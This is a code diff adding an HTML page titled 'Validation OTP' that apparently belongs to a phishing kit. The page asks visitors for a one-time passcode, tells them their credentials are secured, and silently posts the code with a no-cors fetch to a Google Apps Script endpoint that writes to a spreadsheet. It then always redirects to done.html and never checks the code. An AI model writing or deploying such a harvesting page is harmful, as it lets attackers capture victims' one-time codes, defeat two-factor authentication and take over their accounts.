@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Validation OTP</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial, sans-serif;
+background:#D4AF37;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+color:grey;
+}
+
+.container{
+background:white;
+padding:40px;
+border-radius:12px;
+width:400px;
+text-align:center;
+box-shadow:0px 4px 10px rgba(0,0,0,0.1);
+}
+
+h1{
+font-weight:bold;
+color:grey;
+margin-bottom:10px;
+}
+
+h3{
+color:grey;
+font-weight:normal;
+margin-bottom:30px;
+}
+
+label{
+display:block;
+margin-bottom:10px;
+font-weight:bold;
+color:grey;
+text-align:left;
+}
+
+input{
+width:100%;
+padding:12px;
+border-radius:6px;
+border:1px solid grey;
+margin-bottom:20px;
+font-size:16px;
+text-align:center;
+letter-spacing:4px;
+}
+
+button{
+background:grey;
+color:white;
+padding:12px;
+width:100%;
+border:none;
+border-radius:6px;
+font-size:16px;
+cursor:pointer;
+}
+
+button:hover{
+background:#555;
+}
+
+.footer{
+margin-top:20px;
+font-size:13px;
+color:grey;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<h1><b>VALIDATION OTP</b></h1>
+
+<h3>
+Enter the OTP to complete your account validation
+</h3>
+
+<form id="otpForm">
+
+<label>Validation OTP</label>
+
+<input
+type="text"
+id="otp"
+placeholder="Enter OTP"
+required
+pattern="[0-9]{4,8}"
+maxlength="8"
+>
+
+<button type="submit">Submit OTP</button>
+
+</form>
+
+<div class="footer">
+Your credentials are secured.
+</div>
+
+</div>
+
+<script>
+
+const scriptURL =
+"https://script.google.com/macros/s/AKfycbxxfx9v-2rozxbtNX_Ze4o8O2_wAyQXBMNmtENzy19B9Ttzu7BMnrgMIEBXKnUL1xSp/exec";
+
+document.getElementById("otpForm").addEventListener("submit", function(e){
+
+e.preventDefault();
+
+const otp = document.getElementById("otp").value;
+
+/* send OTP to spreadsheet */
+
+fetch(scriptURL,{
+method:"POST",
+mode:"no-cors",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+otp: otp
+})
+});
+
+/* guaranteed redirect */
+
+setTimeout(function(){
+
+window.location.href = "done.html";
+
+}, 500);
+
+});
+
+</script>
+
+</body>
+</html>
